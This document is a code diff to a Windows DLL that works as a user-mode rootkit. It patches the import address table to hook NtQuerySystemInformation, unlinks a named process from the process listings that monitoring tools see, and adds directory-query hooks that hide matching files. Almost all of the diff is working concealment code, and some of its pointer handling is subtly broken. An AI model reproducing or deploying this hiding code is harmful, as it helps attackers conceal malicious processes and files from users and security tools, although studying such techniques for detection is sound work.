@@ -5,6 +5,7 @@
 #include <iostream>
 #include <string>
 #include <winternl.h>
+#include "structs.h"
 
 #pragma warning(disable:4996)
 
@@ -20,29 +21,51 @@ PIMAGE_IMPORT_BY_NAME pImportByNameIAT;
 MEMORY_BASIC_INFORMATION mbi;
 
 BYTE* p_original_func;
+const wchar_t* to_hide = L"Notepad.exe";
 
 NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
-void hideProcess();
+NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
+void dealFileIdBothDirectoryInformation(PVOID FileInformation);
+void dealFileFullDirectoryInformation(PVOID FileInformation);
+std::string getProcName();
+void PatchIAT(std::string to_patch, BYTE* patchedFunc);
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
                      )
+
 {
+
+    std::string proc_name = getProcName();
+    std::string to_patch = "NtQuerySystemInformation";
+
+
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-		OutputDebugString("DLL_PROCESS_ATTACH");
-        hideProcess();
+        PatchIAT(to_patch, (BYTE*)MyNtQuerySystemInformation);
         break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
+		PatchIAT(to_patch, p_original_func);
         break;
     }
     return TRUE;
 }
 
+
+std::string getProcName() {
+	char buffer[MAX_PATH];
+	GetModuleFileNameA(NULL, buffer, MAX_PATH);
+	std::string proc_name = buffer;
+	size_t last_index = proc_name.find_last_of("\\");
+	proc_name = proc_name.substr(last_index + 1);
+	proc_name[0] = toupper(proc_name[0]);
+	OutputDebugString(proc_name.c_str());
+	return proc_name;
+}
 
 void PatchIAT(std::string to_patch, BYTE* patchedFunc) {
     std::string to_patch_a = to_patch + "A";
@@ -53,9 +76,9 @@ void PatchIAT(std::string to_patch, BYTE* patchedFunc) {
     PIMAGE_IMPORT_DESCRIPTOR end = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
     pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
     while (true) {
-        OutputDebugString("Current dll checked");
+        /*OutputDebugString("Current dll checked");
         char* dllname = (char*)((BYTE*)pDosHeader + pImportDescriptor->Name);
-        OutputDebugString(dllname);
+        OutputDebugString(dllname);*/
         pThunkDataINT = (PIMAGE_THUNK_DATA)((BYTE*)pDosHeader + pImportDescriptor->OriginalFirstThunk);
         pThunkDataIAT = (PIMAGE_THUNK_DATA)((BYTE*)pDosHeader + pImportDescriptor->FirstThunk);
         while (true) {
@@ -64,8 +87,6 @@ void PatchIAT(std::string to_patch, BYTE* patchedFunc) {
             }
             pImportByNameINT = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pDosHeader + pThunkDataINT->u1.AddressOfData);
             if (strcmp(pImportByNameINT->Name, to_patch.c_str()) == 0 || strcmp(pImportByNameINT->Name, to_patch_a.c_str()) == 0 || strcmp(pImportByNameINT->Name, to_patch_w.c_str()) == 0) {
-                OutputDebugString("Found the function to patch");
-                OutputDebugString(pImportByNameINT->Name);
                 VirtualQuery(pThunkDataIAT, &mbi, sizeof(mbi));
                 if (mbi.Protect != PAGE_READWRITE) {
                     VirtualProtect(pThunkDataIAT, sizeof(PIMAGE_THUNK_DATA), PAGE_READWRITE, &mbi.Protect);
@@ -97,11 +118,13 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
 		if (SystemInformationClass == SystemProcessInformation) {
             curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation; //we can look at it as a linked list 
             prev = NULL;
-            while(curr)
+            while(true)
             {
                 if (curr->ImageName.Buffer != NULL)
                 {
-                    if (wcscmp(curr->ImageName.Buffer, L"benign.exe") == 0)
+					OutputDebugString("Current process name: ");
+					OutputDebugStringW(curr->ImageName.Buffer);
+                    if (wcscmp(curr->ImageName.Buffer, to_hide) == 0)
                     {
                         OutputDebugString("Found the process to hide");
                         if (prev == NULL) //meaning the process we want to hide was the first in the list
@@ -123,11 +146,13 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
                             }
                         }
                     }
+                    else {
+						prev = curr; // we promote prev only if we didnt find the process to hide
+                    }
                 }
                 
                 if (curr->NextEntryOffset == 0)
                     break;
-                prev = curr;
 				curr = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
             } 
 		}
@@ -136,10 +161,91 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
     return status;
 }
 
+NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
+    NTSTATUS status = ((NTSTATUS(*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN))p_original_func)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+	if (NT_SUCCESS(status)) {
+        switch (FileInformationClass)
+        {
+            case FILE_INFORMATION_CLASS_::FileIdBothDirectoryInformation:
+                dealFileIdBothDirectoryInformation(FileInformation);
+                break;
+            case FILE_INFORMATION_CLASS_::FileFullDirectoryInformation:
+                dealFileFullDirectoryInformation(FileInformation);
+                break;
+        }
+	}
+	return status;
+}
 
 
+void dealFileIdBothDirectoryInformation(PVOID FileInformation) {
+    PFILE_ID_BOTH_DIR_INFORMATION curr;
+    PFILE_ID_BOTH_DIR_INFORMATION prev;
+    curr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
+    prev = NULL;
+    while (curr) {
+        if (curr->FileNameLength != 0) {
+            if (wcscmp(curr->FileName, to_hide) == 0 || wcscmp(curr->ShortName, to_hide) == 0) {
+                OutputDebugString("Found the file to hide");
+                if (prev == NULL) //meaning the file we want to hide was the first in the list
+                {
+                    if (curr->NextEntryOffset == 0) { //this file was also the last just return nothing
+                        FileInformation = NULL;
+                    }
+                    else {
+                        FileInformation = curr + curr->NextEntryOffset;
+                    }
+                }
+                else //the file wasnt the first so we have a previous we can link to the next 
+                {
+                    if (curr->NextEntryOffset == 0) { //this file was also the last just finish in previous
+                        prev->NextEntryOffset = 0;
+                    }
+                    else {
+                        prev->NextEntryOffset += curr->NextEntryOffset; //need to add the offsets
+                    }
+                }
+            }
+        }
+        if (curr->NextEntryOffset == 0)
+            break;
+        prev = curr;
+        curr = (PFILE_ID_BOTH_DIR_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
+    }
+}
 
-void hideProcess() {
-    std::string to_patch = "NtQuerySystemInformation";
-    PatchIAT(to_patch, (BYTE*)MyNtQuerySystemInformation);
+void dealFileFullDirectoryInformation(PVOID FileInformation) {
+	PFILE_FULL_DIR_INFORMATION curr;
+	PFILE_FULL_DIR_INFORMATION prev;
+	curr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
+	prev = NULL;
+	while (curr) {
+		if (curr->FileNameLength != 0) {
+			if (wcscmp(curr->FileName, to_hide) == 0) {
+				OutputDebugString("Found the file to hide");
+				if (prev == NULL) //meaning the file we want to hide was the first in the list
+				{
+					if (curr->NextEntryOffset == 0) { //this file was also the last just return nothing
+						FileInformation = NULL;
+					}
+					else {
+						FileInformation = curr + curr->NextEntryOffset;
+					}
+				}
+				else //the file wasnt the first so we have a previous we can link to the next 
+				{
+					if (curr->NextEntryOffset == 0) { //this file was also the last just finish in previous
+						prev->NextEntryOffset = 0;
+					}
+					else {
+						prev->NextEntryOffset += curr->NextEntryOffset; //need to add the offsets
+					}
+				}
+			}
+		}
+		if (curr->NextEntryOffset == 0)
+			break;
+		prev = curr;
+		curr = (PFILE_FULL_DIR_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
+	}
 }
